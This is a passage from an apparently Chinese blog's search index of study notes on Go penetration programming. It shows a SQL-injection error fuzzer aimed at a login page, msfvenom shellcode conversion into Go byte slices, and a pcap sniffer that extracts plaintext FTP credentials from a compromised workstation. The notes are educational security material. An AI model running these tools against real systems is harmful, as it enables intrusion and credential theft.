class="string">&quot;log&quot;</span></span><br><span class="line">   <span class="string">&quot;net/http&quot;</span></span><br><span class="line">   <span class="string">&quot;regexp&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   payloads := []<span class="type">string</span>&#123; <span class="comment">//要尝试的载荷</span></span><br><span class="line">      <span class="string">&quot;baseline&quot;</span>,</span><br><span class="line">      <span class="string">&quot;)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;(&quot;</span>,</span><br><span class="line">      <span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;&#x27;&quot;</span>,</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   sqlErrors := []<span class="type">string</span>&#123; <span class="comment">//SQL错误信息中的关键字</span></span><br><span class="line">      <span class="string">&quot;SQL&quot;</span>,</span><br><span class="line">      <span class="string">&quot;MySQL&quot;</span>,</span><br><span class="line">      <span class="string">&quot;ORA-&quot;</span>,</span><br><span class="line">      <span class="string">&quot;syntax&quot;</span>,</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   errRegexes := []*regexp.Regexp&#123;&#125; <span class="comment">//1.构建正则切片errRegexes</span></span><br><span class="line">   <span class="keyword">for</span> _, e := <span class="keyword">range</span> sqlErrors &#123;</span><br><span class="line">      re := regexp.MustCompile(fmt.Sprintf(<span class="string">&quot;.*%s.*&quot;</span>, e))</span><br><span class="line">      errRegexes = <span class="built_in">append</span>(errRegexes, re)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> _, payload := <span class="keyword">range</span> payloads &#123; <span class="comment">//2.遍历每个载荷</span></span><br><span class="line">      client := <span class="built_in">new</span>(http.Client)</span><br><span class="line">      body := []<span class="type">byte</span>(fmt.Sprintf(<span class="string">&quot;username=%s&amp;password=p&quot;</span>, payload)) <span class="comment">//2.1构造完整载荷</span></span><br><span class="line">      req, err := http.NewRequest(                                   <span class="comment">//2.2构建POST请求</span></span><br><span class="line">         <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">         <span class="string">&quot;http://10.0.1.20:8080/WebApplication/login.jsp?debug=true&quot;</span>,</span><br><span class="line">         bytes.NewReader(body),</span><br><span class="line">      )</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Fatalf(<span class="string">&quot;[!] Unable to generate request: %s\n&quot;</span>, err)</span><br><span class="line">      &#125;</span><br><span class="line">      req.Header.Add(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>) <span class="comment">//2.3添加Header</span></span><br><span class="line">      resp, err := client.Do(req)                                         <span class="comment">//2.4发送HTTP请求</span></span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Fatalf(<span class="string">&quot;[!] Unable to process response: %s\n&quot;</span>, err)</span><br><span class="line">      &#125;</span><br><span class="line">      body, err = ioutil.ReadAll(resp.Body) <span class="comment">//2.5读取响应内容</span></span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Fatalf(<span class="string">&quot;[!] Unable to read response body: %s\n&quot;</span>, err)</span><br><span class="line">      &#125;</span><br><span class="line">      resp.Body.Close() <span class="comment">//2.6关闭连接</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> idx, re := <span class="keyword">range</span> errRegexes &#123; <span class="comment">//3.遍历HTTP响应内容是否命中errRegexes</span></span><br><span class="line">         <span class="keyword">if</span> re.MatchString(<span class="type">string</span>(body)) &#123;</span><br><span class="line">            fmt.Printf(</span><br><span class="line">               <span class="string">&quot;[+] SQL Error found (&#x27;%s&#x27;) for payload: %s\n&quot;</span>,</span><br><span class="line">               sqlErrors[idx],</span><br><span class="line">               payload,</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20230201141058178.png" alt="image-20230201141058178"></p><ul><li>书中还提到了代码功能的改进和添加</li></ul>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9.3构造shellcode</title>
      <link href="/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/9.3%E6%9E%84%E9%80%A0shellcode/"/>
      <url>/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/9.3%E6%9E%84%E9%80%A0shellcode/</url>
      
        <content type="html"><![CDATA[<h4 id="msf生成shellcode"><a href="#msf生成shellcode" class="headerlink" title="msf生成shellcode"></a>msf生成shellcode</h4><ul><li>由于msf没有原生的Go格式。我们需要把常用的格式(C，hex，num，raw，Base64)转换成Go能使用的切片格式</li></ul><h5 id="C转换"><a href="#C转换" class="headerlink" title="C转换"></a>C转换</h5><ul><li>删除分号，并更改换行符。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload := []<span class="type">byte</span>(<span class="string">&quot;\xfc\xe8\x82...&quot;</span>).</span><br></pre></td></tr></table></figure><h5 id="hex转换"><a href="#hex转换" class="headerlink" title="hex转换"></a>hex转换</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload, err := hex.DecodeString(<span class="string">&quot;hex数据&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="num转换"><a href="#num转换" class="headerlink" title="num转换"></a>num转换</h5><ul><li>可以之间在字节切片中使用</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload := []<span class="type">byte</span>&#123;</span><br><span class="line"><span class="number">0xfc</span>,<span class="number">0xe8</span>,<span class="number">0x82</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="raw转换"><a href="#raw转换" class="headerlink" title="raw转换"></a>raw转换</h4><ul><li>原生的二进制数据，会有不可见字符。我们将其转成num形式。可以使用Linux的xxd命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p [payload] [options] -f raw | xxd -i</span><br></pre></td></tr></table></figure><h5 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h5><ul><li>虽然msfvenom不含纯Base64编码器，但遇到Base64格式的二进制数据很常见</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p [payload][options]-f raw | <span class="built_in">base64</span></span><br></pre></td></tr></table></figure><ul><li>与C输出类似，生成的载荷包含换行符。需要进行处理，可以使用Linux</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p [payload][options]-f raw | base64 | tr -d <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure><ul><li>使用</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload, err := base64.strEncoding.DecodeString(<span class="string">&quot;base64&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="关于汇编"><a href="#关于汇编" class="headerlink" title="关于汇编"></a>关于汇编</h4><ul><li>谈及shellcode，离不开汇编。</li><li>但Go与汇编的集成是有限的；Go不支持内联汇编。Go仅支持基于Plan9操作系统的—种汇编变体，这种汇编语法几乎不存在。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9.2代码移植Go</title>
      <link href="/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/9.2%E4%BB%A3%E7%A0%81%E7%A7%BB%E6%A4%8DGo/"/>
      <url>/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/9.2%E4%BB%A3%E7%A0%81%E7%A7%BB%E6%A4%8DGo/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul><li>出于各种原因，我们可能需要将现有漏洞利用移植到Go中</li><li>其中原因可能是现有的利用代码已损坏、不完整或与你要针对的系统或版本不兼容</li><li>尽管你可以使用创建时使用的相同语言来扩展或更新已损坏或不完整的代码</li><li>但是G0可以为你提供轻松的交叉编译、一致的语法和缩进规则以及强大的标准库。</li><li>所有这一切都将使得利用代码具有更高的可移植性和可读性，而不会影响其功能。</li></ul><h4 id="从python移植"><a href="#从python移植" class="headerlink" title="从python移植"></a>从python移植</h4><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230201141727592.png" alt="image-20230201141727592"></p>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8.被动嗅探</title>
      <link href="/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/8.%E8%A2%AB%E5%8A%A8%E5%97%85%E6%8E%A2/"/>
      <url>/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/8.%E8%A2%AB%E5%8A%A8%E5%97%85%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h4 id="使用pcap子包识别设备"><a href="#使用pcap子包识别设备" class="headerlink" title="使用pcap子包识别设备"></a>使用pcap子包识别设备</h4><ul><li>需要包  github.com&#x2F;google&#x2F;gopacket&#x2F;pcap</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   devices, err := pcap.FindAllDevs()</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> _, device := <span class="keyword">range</span> devices &#123;</span><br><span class="line">      fmt.Println(device.Name)</span><br><span class="line">      <span class="keyword">for</span> _, address := <span class="keyword">range</span> device.Addresses &#123;</span><br><span class="line">         fmt.Printf(<span class="string">&quot;    IP:      %s\n&quot;</span>, address.IP)</span><br><span class="line">         fmt.Printf(<span class="string">&quot;    Netmask: %s\n&quot;</span>, address.Netmask)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230131202558116.png" alt="image-20230131202558116"></p><h4 id="实时捕获和结果过滤"><a href="#实时捕获和结果过滤" class="headerlink" title="实时捕获和结果过滤"></a>实时捕获和结果过滤</h4><ul><li>如何使用gopacket包在线捕获实时数据包</li><li>如何使用BRF语法过滤数据包（<a href="http://www.tcpdump.org/manpages/pcap-filter.7.html%EF%BC%89">http://www.tcpdump.org/manpages/pcap-filter.7.html）</a></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;log&quot;</span></span><br><span class="line">   <span class="string">&quot;github.com/google/gopacket&quot;</span></span><br><span class="line">   <span class="string">&quot;github.com/google/gopacket/pcap&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (  <span class="comment">//设置数据包捕获所需的变量</span></span><br><span class="line">   iface    = <span class="string">&quot;enp0s5&quot;</span>          <span class="comment">//接口名称</span></span><br><span class="line">   snaplen  = <span class="type">int32</span>(<span class="number">1600</span>)       <span class="comment">//快照长度</span></span><br><span class="line">   promisc  = <span class="literal">false</span>             <span class="comment">//是否以混杂模式运行</span></span><br><span class="line">   timeout  = pcap.BlockForever <span class="comment">//超时</span></span><br><span class="line">   filter   = <span class="string">&quot;tcp and port 80&quot;</span> <span class="comment">//BRF过滤器</span></span><br><span class="line">   devFound = <span class="literal">false</span>             <span class="comment">//是否找到</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   devices, err := pcap.FindAllDevs() <span class="comment">//查找所有设备</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> _, device := <span class="keyword">range</span> devices &#123;   <span class="comment">//检索所有设备</span></span><br><span class="line">      <span class="keyword">if</span> device.Name == iface &#123;</span><br><span class="line">         devFound = <span class="literal">true</span>            <span class="comment">//找到了目标设备iface，devFound = true</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> !devFound &#123;                     <span class="comment">//没找到</span></span><br><span class="line">      log.Panicf(<span class="string">&quot;Device named &#x27;%s&#x27; does not exist\n&quot;</span>, iface)</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/**** 创建一个*pcap.Handle，它允许我们读取和注入数据包  ****/</span></span><br><span class="line">   <span class="comment">/**** 使用这个handle，可以用一个BRF过滤器并创建一个新的包数据源，从中读取数据包  ****/</span></span><br><span class="line">   handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)  <span class="comment">//1.创建一个*pcap.Handle</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> handle.Close()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> err := handle.SetBPFFilter(filter); err != <span class="literal">nil</span> &#123;  <span class="comment">//2.为handle设置BRF过滤器</span></span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   source := gopacket.NewPacketSource(handle, handle.LinkType())  <span class="comment">//3.创建新的数据源</span></span><br><span class="line">   <span class="keyword">for</span> packet := <span class="keyword">range</span> source.Packets() &#123;  <span class="comment">//4.读取数据包并输出  (source.Packets()返回一个channel，从中读取)</span></span><br><span class="line">      fmt.Println(packet)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>尽管输出结果不太容易理解，但每层都进行了很好的隔离</li><li>现在可以使用实用函数packer.ApplicationLayer()和packet.Data()来检索，再使用hex.Dump()显示内容</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230131205635676.png" alt="image-20230131205635676"></p><h4 id="嗅探和显示明文用户凭证（FTP案例）"><a href="#嗅探和显示明文用户凭证（FTP案例）" class="headerlink" title="嗅探和显示明文用户凭证（FTP案例）"></a>嗅探和显示明文用户凭证（FTP案例）</h4><ul><li>现在，大多数组织使用的都是交换网络，即直接在两个端点之间发送数据；</li><li>而不是通过广播发送数据，这使得在目标组织环境中被动捕获流量变得更加困难</li><li>当与地址解析协议ARP中毒(一种可以强迫端点与交换网络上的恶意设备进行通信的攻击)配合攻击时；</li><li>或者当你从被攻陷的用户工作站中，<strong>秘密嗅探</strong>出站流量时；</li><li>一下明文嗅探攻击会非常有效。此示例假设我们以及攻陷了一个用户工作站，且仅专注捕获FTP流量(代码简短)</li><li>要提取或检查其他层和数据，可以采取与此类似的方法。在本示例中只需要应用层在和即可。<ul><li>相比上面的代码，只需要更改10余行</li></ul></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;bytes&quot;</span></span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;log&quot;</span></span><br><span class="line">   <span class="string">&quot;github.com/google/gopacket&quot;</span></span><br><span class="line">   <span class="string">&quot;github.com/google/gopacket/pcap&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ( <span class="comment">//设置数据包捕获所需的变量</span></span><br><span class="line">   iface    = <span class="string">&quot;\\Device\\NPF_&#123;B3E230B9-9E26-4530-A81D-3FD548C39768&#125;&quot;</span> <span class="comment">//接口名称</span></span><br><span class="line">   snaplen  = <span class="type">int32</span>(<span class="number">1600</span>)                                            <span class="comment">//快照长度</span></span><br><span class="line">   promisc  = <span class="literal">false</span>                                                  <span class="comment">//是否以混杂模式运行</span></span><br><span class="line">   timeout  = pcap.BlockForever                                      <span class="comment">//超时</span></span><br><span class="line">   filter   = <span class="string">&quot;tcp and dst port 21&quot;</span>                                  <span class="comment">//BRF过滤器</span></span><br><span class="line">   devFound = <span class="literal">false</span>                                                  <span class="comment">//是否找到</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   devices, err := pcap.FindAllDevs() <span class="comment">//查找所有设备</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> _, device := <span class="keyword">range</span> devices &#123; <span class="comment">//检索所有设备</span></span><br><span class="line">      <span class="keyword">if</span> device.Name == iface &#123;</span><br><span class="line">         devFound = <span class="literal">true</span> <span class="comment">//找到了目标设备iface，devFound = true</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> !devFound &#123; <span class="comment">//没找到</span></span><br><span class="line">      log.Panicf(<span class="string">&quot;Device named &#x27;%s&#x27; does not exist\n&quot;</span>, iface)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**** 创建一个*pcap.Handle，它允许我们读取和注入数据包  ****/</span></span><br><span class="line">   <span class="comment">/**** 使用这个handle，可以用一个BRF过滤器并创建一个新的包数据源，从中读取数据包  ****/</span></span><br><span class="line">   handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout) <span class="comment">//1.创建一个*pcap.Handle</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> handle.Close()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> err := handle.SetBPFFilter(filter); err != <span class="literal">nil</span> &#123; <span class="comment">//2.为handle设置BRF过滤器</span></span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   source := gopacket.NewPacketSource(handle, handle.LinkType()) <span class="comment">//3.创建新的数据源</span></span><br><span class="line">   <span class="keyword">for</span> packet := <span class="keyword">range</span> source.Packets() &#123;                        <span class="comment">//4.读取数据包</span></span><br><span class="line">      appLayer := packet.ApplicationLayer() <span class="comment">//5.通过检查packet.ApplicationLayer()的响应值来确定是否存在应用层</span></span><br><span class="line">      <span class="keyword">if</span> appLayer == <span class="literal">nil</span> &#123;                  <span class="comment">//不存在，continue</span></span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      payload := appLayer.Payload()         <span class="comment">//6.从应用层提取载荷(FTP命令/数据)</span></span><br><span class="line">      <span class="comment">/*** 提取载荷后，检查载荷中是否包含USER或PASS命令 ***/</span></span><br><span class="line">      <span class="keyword">if</span> bytes.Contains(payload, []<span class="type">byte</span>(<span class="string">&quot;USER&quot;</span>)) &#123;</span><br><span class="line">         fmt.Print(<span class="type">string</span>(payload))</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> bytes.Contains(payload, []<span class="type">byte</span>(<span class="string">&quot;PASS&quot;</span>)) &#123;</span><br><span class="line">         fmt.Print(<span class="type">string</span>(payload))</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230131214813093.png" alt="image-20230131214813093"></p><h4 id="通过SYN泛洪保护进行端口扫描"><a href="#通过SYN泛洪保护进行端口扫描" class="headerlink" title="通过SYN泛洪保护进行端口扫描"></a>通过SYN泛洪保护进行端口扫描</h4><h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><ul><li>某些情况下，扫描器会产生不正确的结果。<ul><li>例如：当目标使用SYN泛洪保护时，通常所有打开、关闭和过滤的端口都会产生相同的包交换，来表明该端口处于opening，这些保护被称为SYN cookie。可以防止SYN泛洪攻击，<strong>模糊</strong>攻击者，产生误报</li></ul></li><li>那么在目标使用SYN泛洪保护时，如何确定服务是在监听端口，还是设备错误的显示端口opening<ul><li>在这两种情况下，<strong>TCP三次握手均完成</strong>，大多数扫描工具(包括Nmap)都会查看这个序列(或它的变体，取决扫描类型)来确定端口状态。因此很可能会误报</li></ul></li></ul><h5 id="检查TCP标志位"><a href="#检查TCP标志位" class="headerlink" title="检查TCP标志位"></a>检查TCP标志位</h5><ul><li>若考虑到SYN cookie，则必须<strong>拓展端口扫描</strong>功能，通过检查连接建立后是否从目标接收到其他数据包来超越三次握手。</li><li>要实现这点：可以通过嗅探数据包查看是否有任何数据包使用附加的、合法服务通信的TCP标志位的值<strong>标识</strong>进行传输</li><li>TCP标志位表示有关数据包传输状态的信息。如果查看TCP规范，就会发现这些标志位存储在数据包报头的第14个字节中。该字节的每一位代表一个标志位的值。如果该位置的位是1，则标记为on；如果是0，则标记为off。下表显示了根据TCP规范，标志位在字节中的位置。</li></ul><table><thead><tr><th>位</th><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th><th></th></tr></thead><tbody><tr><td>标记</td><td>CWR</td><td>ECE</td><td>URG</td><td><strong>ACK</strong></td><td><strong>PSH</strong></td><td>RST</td><td><strong>SYN</strong></td><td><strong>FIN</strong></td><td></td></tr></tbody></table><ul><li>知道了所关心的标志位的位置后，可以创建一个过滤器来检查。</li><li>例如，可以查找包含一下标志位的数据包，这些标志位可能表示监听服务<ul><li>ACK和FIN</li><li>ACK</li><li>ACK和PSH</li></ul></li></ul><h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;log&quot;</span></span><br><span class="line">   <span class="string">&quot;net&quot;</span></span><br><span class="line">   <span class="string">&quot;os&quot;</span></span><br><span class="line">   <span class="string">&quot;strings&quot;</span></span><br><span class="line">   <span class="string">&quot;time&quot;</span></span><br><span class="line">   <span class="string">&quot;github.com/google/gopacket&quot;</span></span><br><span class="line">   <span class="string">&quot;github.com/google/gopacket/pcap&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ( <span class="comment">//设置数据包捕获所需的变量</span></span><br><span class="line">   <span class="comment">//接口名称(在下面main函数中命令行读取)</span></span><br><span class="line">   snaplen  = <span class="type">int32</span>(<span class="number">320</span>)                                              <span class="comment">//快照长度</span></span><br><span class="line">   promisc  = <span class="literal">true</span>                                                    <span class="comment">//是否以混杂模式运行 true</span></span><br><span class="line">   timeout  = pcap.BlockForever                                       <span class="comment">//超时</span></span><br><span class="line">   filter   = <span class="string">&quot;tcp[13] == 0x11 or tcp[13] == 0x10 or tcp[13] == 0x18&quot;</span> <span class="comment">//BRF过滤器</span></span><br><span class="line">   devFound = <span class="literal">false</span>                                                   <span class="comment">//是否找到</span></span><br><span class="line">  